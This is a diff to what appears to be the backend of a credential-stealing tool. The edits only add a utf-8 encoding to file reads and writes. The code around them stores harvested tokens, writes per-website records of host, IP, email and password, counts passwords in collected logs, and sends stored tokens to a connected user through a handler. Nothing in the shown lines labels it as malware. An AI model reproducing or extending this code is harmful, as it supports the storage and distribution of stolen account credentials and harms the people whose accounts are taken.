@@ -672,7 +672,7 @@ class Get:
         wbs = []
         for w in listdir(path):
             wb = w.split('.txt')[0]
-            with open(path + w, 'r') as f:
+            with open(path + w, 'r', encoding=encoding) as f:
                 ww = f.read().splitlines()
             wt = sum('password' in l for l in ww)
             wb += ' [{}]'.format(wt)
@@ -680,7 +680,7 @@ class Get:
         return wbs
     
     def get_path_passwords(path):
-        with open(path, 'r') as f:
+        with open(path, 'r', encoding=encoding) as f:
             lines = f.read().splitlines()
         allw = []
         search = ''
@@ -704,9 +704,9 @@ class Get:
 class Stock:
 
     def tokens(data) -> bool:
-        with open("db/tokens/tokens.txt", 'r') as f:
+        with open("db/tokens/tokens.txt", 'r', encoding=encoding) as f:
             read = f.read()
-        with open("db/tokens/tokens.txt", 'a') as f:
+        with open("db/tokens/tokens.txt", 'a', encoding=encoding) as f:
             if data not in read:
                 f.write(data + '\n')
 
@@ -717,7 +717,7 @@ class Stock:
             for k, v in element.items():
                 passdata += "{}: {}\n".format(k, v)
             passdata += "\n"
-        with open(filename, 'w') as f:
+        with open(filename, 'w', encoding=encoding) as f:
             f.write(passdata)
         return filename
     
@@ -735,11 +735,11 @@ class Stock:
             if host is None or email is None or password is None:
                 continue
             if not isfile("db/websites/"+host+".txt"):
-                with open("db/websites/"+host+".txt", 'w'):
+                with open("db/websites/"+host+".txt", 'w', encoding=encoding):
                     pass
-            with open("db/websites/"+host+".txt", 'r') as f:
+            with open("db/websites/"+host+".txt", 'r', encoding=encoding) as f:
                 read = f.read()
-            with open("db/websites/"+host+".txt", 'a') as f:
+            with open("db/websites/"+host+".txt", 'a', encoding=encoding) as f:
                 data = "host: {}\nip: {}\nemail: {}\npassword: {}\n\n".format(realhost, ip, email, password)
                 if data not in read:
                     f.write(data)
@@ -750,6 +750,10 @@ class Stock:
 
 from src.db import Stock, Get
 from src.webhooks import Webhooks, get_webhooks
+
+
+# ENCODING
+encoding = "utf-8"
 
 
 # CLASS
@@ -786,7 +790,7 @@ class Handler:
             user.send(get_webhooks())
         
         elif data == "tokens":
-            tokens = open("db/tokens/tokens.txt", 'r').read()
+            tokens = open("db/tokens/tokens.txt", 'r', encoding=encoding).read()
             if tokens:
                 user.send(tokens)
             else:
